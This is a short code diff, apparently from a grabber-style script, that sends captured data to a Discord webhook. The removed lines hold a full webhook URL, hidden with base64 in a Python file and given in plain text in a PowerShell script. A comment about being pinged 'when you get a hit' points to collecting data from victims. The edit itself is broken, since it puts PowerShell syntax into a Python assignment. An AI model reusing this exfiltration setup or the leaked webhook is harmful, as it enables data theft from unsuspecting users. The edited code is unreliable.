@@ -9,7 +9,7 @@ import base64
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = base64.b64decode(b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA2MzUyODY1NjUyMzI0MzU5MC8xOEpvSHp0REZMdHk0c3hNTl9zS2hheU13Ujlib3NTdGluaUh1cmw2UGdpQWdGVzBDX0l4Q3FSdWc5MkpydUZLVWgxNA==').decode()
+WEBHOOK_URL = $hookurl
 
 # mentions you when you get a hit
 PING_ME = False
@@ -91,8 +91,6 @@ param (
     [parameter(Position=1,Mandatory=$False)]
     [string]$text 
 )
-
-$hookurl = 'https://discord.com/api/webhooks/1063528656523243590/18JoHztDFLty4sxMN_sKhayMwR9bosStiniHurl6PgiAgFW0C_IxCqRug92JruFKUh14'
 
 $Body = @{
   'content' = $text
